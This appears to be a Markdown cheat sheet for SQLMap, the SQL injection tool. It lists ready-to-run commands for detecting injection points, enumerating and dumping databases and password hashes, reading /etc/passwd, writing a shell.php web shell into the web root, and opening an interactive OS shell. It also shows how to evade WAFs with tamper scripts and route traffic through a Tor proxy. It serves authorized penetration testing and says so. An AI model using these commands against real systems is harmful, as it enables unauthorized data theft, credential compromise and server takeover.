# SQLMap Cheat Sheet

> A comprehensive SQLMap cheat sheet covering reconnaissance, database enumeration, data extraction, file operations, OS access, and advanced options.

---

# 📖 What is SQLMap?

**SQLMap** is an open-source penetration testing tool that automates the process of detecting and exploiting SQL Injection (SQLi) vulnerabilities.

**Features**
- Detect SQL Injection vulnerabilities
- Enumerate databases
- Dump database contents
- Crack password hashes
- Upload/download files (where supported)
- Execute operating system commands (where supported)
- Access an SQL shell or OS shell

---

# 🛠 Basic Syntax

```bash
sqlmap -u "http://target.com/page.php?id=1"
```

Where:

- `-u` → Target URL
- `--data` → POST data
- `-p` → Parameter to test

Example:

```bash
sqlmap -u "http://example.com/index.php?id=1"
```

---

# 🌐 Testing URLs

Test GET parameter

```bash
sqlmap -u "http://site.com/page.php?id=1"
```

Test multiple parameters

```bash
sqlmap -u "http://site.com/page.php?id=1&cat=2"
```

Test specific parameter

```bash
sqlmap -u "http://site.com/page.php?id=1" -p id
```

---

# 📤 POST Requests

```bash
sqlmap -u "http://site.com/login.php" \
--data="username=admin&password=test"
```

Test only password

```bash
sqlmap -u URL --data="username=test&password=test" -p password
```

---

# 🍪 Cookies

```bash
sqlmap -u URL --cookie="PHPSESSID=abc123"
```

---

# 🧾 Headers

User-Agent

```bash
sqlmap -u URL --user-agent="Mozilla/5.0"
```

Referer

```bash
sqlmap -u URL --referer="http://google.com"
```

Custom Header

```bash
sqlmap -u URL -H "Authorization: Bearer TOKEN"
```

---

# 📁 Request File

Save a request using Burp Suite.

```bash
sqlmap -r request.txt
```

---

# 🔍 Detection Options

Increase detection level

```bash
--level=5
```

Increase risk

```bash
--risk=3
```

Both together

```bash
sqlmap -u URL --level=5 --risk=3
```

---

# 🧠 DBMS Detection

Identify database

```bash
sqlmap -u URL --fingerprint
```

Specify DBMS

```bash
--dbms=mysql
```

Examples

```bash
--dbms=mysql
--dbms=postgresql
--dbms=mssql
--dbms=oracle
```

---

# 📚 Enumeration

Current Database

```bash
sqlmap -u URL --current-db
```

Current User

```bash
sqlmap -u URL --current-user
```

Hostname

```bash
sqlmap -u URL --hostname
```

Database Version

```bash
sqlmap -u URL --banner
```

---

# 🗃 Databases

List databases

```bash
sqlmap -u URL --dbs
```

---

# 📂 Tables

List tables

```bash
sqlmap -u URL -D database --tables
```

---

# 📑 Columns

List columns

```bash
sqlmap -u URL -D database -T users --columns
```

---

# 📤 Dump Data

Dump table

```bash
sqlmap -u URL -D database -T users --dump
```

Dump specific columns

```bash
sqlmap -u URL -D database -T users -C username,password --dump
```

Dump entire database

```bash
sqlmap -u URL -D database --dump-all
```

---

# 🔑 Password Hashes

Dump password hashes

```bash
sqlmap -u URL --passwords
```

---

# 📋 Users

Enumerate DB users

```bash
sqlmap -u URL --users
```

---

# 👑 Privileges

List privileges

```bash
sqlmap -u URL --privileges
```

---

# 🧑‍💻 Roles

```bash
sqlmap -u URL --roles
```

---

# 💾 File System (Supported DBMS Only)

Read file

```bash
sqlmap -u URL --file-read="/etc/passwd"
```

Write file

```bash
sqlmap -u URL --file-write=shell.php \
--file-dest=/var/www/html/shell.php
```

---

# ⚡ Operating System Access

Execute command

```bash
sqlmap -u URL --os-cmd="whoami"
```

Interactive shell

```bash
sqlmap -u URL --os-shell
```

SQL Shell

```bash
sqlmap -u URL --sql-shell
```

---

# 🔍 Search

Search databases

```bash
sqlmap -u URL --search
```

Search table

```bash
sqlmap -u URL --search -T users
```

Search column

```bash
sqlmap -u URL --search -C password
```

---

# 🎯 Batch Mode

Automatically answer prompts

```bash
sqlmap -u URL --batch
```

---

# 🚀 Performance

Threads

```bash
--threads=10
```

Keep Alive

```bash
--keep-alive
```

Null Connection

```bash
--null-connection
```

---

# 🧹 Cleanup

Flush previous session

```bash
--flush-session
```

---

# 📝 Output

Verbose Level

```bash
-v 0
-v 1
-v 2
-v 3
-v 4
-v 5
-v 6
```

Highest verbosity

```bash
-v 6
```

---

# 🔐 Authentication

Basic Authentication

```bash
--auth-type=Basic
--auth-cred=admin:password
```

---

# 🌍 Proxy

HTTP Proxy

```bash
--proxy=http://127.0.0.1:8080
```

SOCKS Proxy

```bash
--proxy=socks5://127.0.0.1:9050
```

---

# 📄 Random User-Agent

```bash
--random-agent
```

---

# 🍪 Ignore HTTP Codes

```bash
--ignore-code=404
```

---

# 📦 Crawl Website

```bash
--crawl=3
```

---

# 🛡 WAF Detection

```bash
--identify-waf
```

---

# 🔄 Tamper Scripts

List tamper scripts

```bash
--list-tampers
```

Use one tamper

```bash
--tamper=space2comment
```

Use multiple tampers

```bash
--tamper=space2comment,between,charencode
```

---

# 📊 Common Enumeration Workflow

```text
Target URL
     │
     ▼
Detect SQL Injection
     │
     ▼
Identify DBMS
     │
     ▼
List Databases
     │
     ▼
List Tables
     │
     ▼
List Columns
     │
     ▼
Dump Required Data
```

---

# ⭐ Commonly Used Commands

```bash
sqlmap -u URL --dbs

sqlmap -u URL -D db --tables

sqlmap -u URL -D db -T users --columns

sqlmap -u URL -D db -T users --dump

sqlmap -u URL --current-db

sqlmap -u URL --current-user

sqlmap -u URL --batch

sqlmap -r request.txt

sqlmap -u URL --random-agent

sqlmap -u URL --level=5 --risk=3

sqlmap -u URL --fingerprint

sqlmap -u URL --banner

sqlmap -u URL --proxy=http://127.0.0.1:8080
```

---

# 📌 Notes

- SQLMap should only be used against systems you own or have explicit authorization to test.
- Many features depend on the target DBMS and server configuration.
- Always save requests from tools like Burp Suite (`-r request.txt`) for more accurate testing of complex applications.
- Increase `--level` and `--risk` gradually to balance thoroughness with request volume.

---

## ⭐ Contribute

If this cheat sheet helped you, consider giving the repository a **⭐ Star** and contributing improvements through pull requests.
